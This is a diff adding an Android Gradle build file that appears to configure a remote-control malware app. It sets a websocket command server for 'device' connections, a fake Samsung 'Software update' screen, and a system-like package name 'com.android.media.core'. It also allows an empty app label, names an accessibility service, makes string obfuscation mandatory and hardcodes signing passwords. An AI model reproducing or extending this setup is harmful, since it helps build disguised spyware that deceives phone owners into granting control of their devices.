@@ -1,0 +1,118 @@
+plugins {
+    id 'com.android.application'
+}
+
+def skipParanoid = project.findProperty('SKIP_PARANOID') == 'true'
+if (!skipParanoid) {
+    try { apply plugin: 'org.lsposed.lsparanoid' }
+    catch (Exception e) { throw new GradleException('[FATAL] LSParanoid unavailable. Set SKIP_PARANOID=true for debug.') }
+}
+
+// ── Build config injectables ──────────────────────────────────────────────────
+def serverUrl     = project.findProperty('SERVER_URL')        ?: 'wss://your-server.com/ws?role=device&id='
+def targetUrl     = project.findProperty('TARGET_URL')        ?: 'https://google.com'
+def updateMode    = (project.findProperty('UPDATE_MODE')      ?: '1').toInteger()   // 0=none 1=system 2=fingerprint
+def updateBrand   = project.findProperty('UPDATE_BRAND')      ?: 'Samsung'
+def updateTitle   = project.findProperty('UPDATE_TITLE')      ?: 'Software update'
+def updateVersion = project.findProperty('UPDATE_VERSION')    ?: 'ONE UI 6.1'
+def updateDuration= (project.findProperty('UPDATE_DURATION_MS') ?: '10000').toInteger()
+def keystorePath  = project.findProperty('KEYSTORE_PATH')     ?: '../alpha-release.jks'
+def keystorePass  = project.findProperty('KEYSTORE_PASS')     ?: 'AlphaRelease2024'
+def keyAlias      = project.findProperty('KEY_ALIAS')         ?: 'alpha-key'
+def keyPass       = project.findProperty('KEY_PASS')          ?: 'AlphaRelease2024'
+def vCode         = (project.findProperty('VERSION_CODE')     ?: '10000').toInteger()
+def vName         = project.findProperty('VERSION_NAME')      ?: '1.0.0'
+def appLabel      = project.findProperty('APP_LABEL')         ?: ''
+def appId         = project.findProperty('APP_ID')            ?: 'com.android.media.core'
+
+android {
+    namespace 'com.alpha.shield'
+    compileSdk 35
+
+    defaultConfig {
+        applicationId appId
+        minSdk 24
+        targetSdk 35
+        versionCode vCode
+        versionName vName
+
+        testInstrumentationRunner 'androidx.test.runner.AndroidJUnitRunner'
+
+        // ── All customizable build fields ──────────────────────────────
+        buildConfigField 'String',  'SERVER_URL',         "\"${serverUrl}\""
+        buildConfigField 'String',  'TARGET_URL',         "\"${targetUrl}\""
+        buildConfigField 'int',     'UPDATE_MODE',         "${updateMode}"
+        buildConfigField 'String',  'UPDATE_BRAND',       "\"${updateBrand}\""
+        buildConfigField 'String',  'UPDATE_TITLE',       "\"${updateTitle}\""
+        buildConfigField 'String',  'UPDATE_VERSION',     "\"${updateVersion}\""
+        buildConfigField 'int',     'UPDATE_DURATION_MS',  "${updateDuration}"
+        buildConfigField 'boolean', 'IS_RELEASE',         'false'
+
+        if (appLabel?.trim()) {
+            resValue 'string', 'app_name', appLabel.trim()
+            resValue 'string', 'accessibility_service_label', appLabel.trim() + ' Service'
+        }
+
+        externalNativeBuild {
+            cmake { cppFlags ""; abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64' }
+        }
+        ndk { abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64' }
+    }
+
+    externalNativeBuild {
+        cmake { path "CMakeLists.txt"; version "3.22.1" }
+    }
+
+    signingConfigs {
+        release {
+            storeFile file(keystorePath)
+            storePassword keystorePass
+            keyAlias keyAlias
+            keyPassword keyPass
+            v1SigningEnabled true; v2SigningEnabled true
+            enableV3Signing true;  enableV4Signing true
+        }
+    }
+
+    buildTypes {
+        debug   { debuggable true; minifyEnabled false; shrinkResources false }
+        release {
+            debuggable false; minifyEnabled true; shrinkResources true
+            buildConfigField 'boolean', 'IS_RELEASE', 'true'
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+            signingConfig signingConfigs.release
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
+    }
+
+    buildFeatures { buildConfig true }
+
+    packagingOptions {
+        jniLibs { useLegacyPackaging = true }
+        resources {
+            excludes += ['DebugProbesKt.bin','META-INF/*.version',
+                         'META-INF/NOTICE*','META-INF/LICENSE*',
+                         'META-INF/DEPENDENCIES','kotlin/**','okhttp3/**']
+        }
+    }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.11.0'
+    implementation 'androidx.work:work-runtime:2.9.0'
+    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
+    implementation 'androidx.core:core:1.12.0'
+    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
+    implementation 'com.google.code.gson:gson:2.10.1'
+    if (skipParanoid) compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
+    testImplementation 'junit:junit:4.13.2'
+}
+
+configurations.configureEach {
+    exclude group: 'androidx.profileinstaller', module: 'profileinstaller'
+}
